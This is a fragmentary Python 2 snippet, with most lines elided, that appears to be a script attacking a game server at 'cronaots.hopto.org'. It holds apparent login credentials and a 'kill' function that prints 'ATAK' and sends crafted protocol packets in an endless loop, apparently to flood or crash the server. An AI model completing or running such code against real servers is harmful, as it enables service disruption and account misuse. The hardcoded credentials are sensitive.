...
dane = ("cronaots.hopto.org",795238,"maniek","Laggerboy")
...
def kill(tab):
    ...
    print ">>>  ATAK"
    s.send(addMessageLenght(chr(0x64)))
    ...
    while True:
        ...
        s.send(addMessageLenght(chr(0x6F)))
        s.send(addMessageLenght(chr(0x70)))
        s.send(addMessageLenght(chr(0x71)))
        s.send(addMessageLenght(chr(0x72)))
